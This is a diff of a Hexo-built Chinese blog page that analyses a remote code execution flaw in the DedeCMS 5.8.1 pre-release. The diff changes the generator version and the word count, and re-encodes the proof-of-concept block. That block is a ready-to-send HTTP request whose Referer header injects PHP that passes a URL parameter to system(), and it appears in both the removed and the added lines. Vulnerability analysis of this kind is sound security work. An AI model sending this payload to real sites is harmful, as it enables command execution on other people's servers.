@@ -32,7 +32,7 @@
     KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
     KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
   </script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 5.4.2"></head>
 
 
 <body>
@@ -247,7 +247,7 @@
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>382 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>376 字</span>
             </span>
         
         
@@ -277,7 +277,7 @@
 <p>这个漏洞只影响5.8.1 预发布版本<br>下载链接：<a class="link" target="_blank" rel="noopener" href="https://github.com/dedecms/DedeCMS/archive/refs/tags/v5.8.1.zip">https://github.com/dedecms/DedeCMS/archive/refs/tags/v5.8.1.zip<i class="fas fa-external-link-alt"></i></a></p>
 <p>验证版本：<a class="link" target="_blank" rel="noopener" href="http://127.0.0.1/DedeCMS-5.8.1/data/admin/ver.txt">http://127.0.0.1/DedeCMS-5.8.1/data/admin/ver.txt<i class="fas fa-external-link-alt"></i></a><br><img src="image-20211012155400476.png" alt="image-20211012155400476"></p>
 <p>先看一下它的poc跟着走一下代码<br>POC：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;plus&#x2F;flink.php?dopost&#x3D;save&amp;c&#x3D;id HTTP&#x2F;1.1</span><br><span class="line">Host: target</span><br><span class="line">Referer: &lt;?php &quot;system&quot;($c);die;&#x2F;*</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /plus/flink.php?dopost=save&amp;c=id HTTP/1.1</span><br><span class="line">Host: target</span><br><span class="line">Referer: &lt;?php &quot;system&quot;($c);die;/*</span><br></pre></td></tr></table></figure>
 <p>bp抓包，修改一下，传给phpstorm<br><img src="image-20211012162516995.png" alt="image-20211012162516995"></p>
 <p>跳到ShowMsg函数里面</p>
 <p><img src="image-20211012162614100.png" alt="image-20211012162614100"></p>
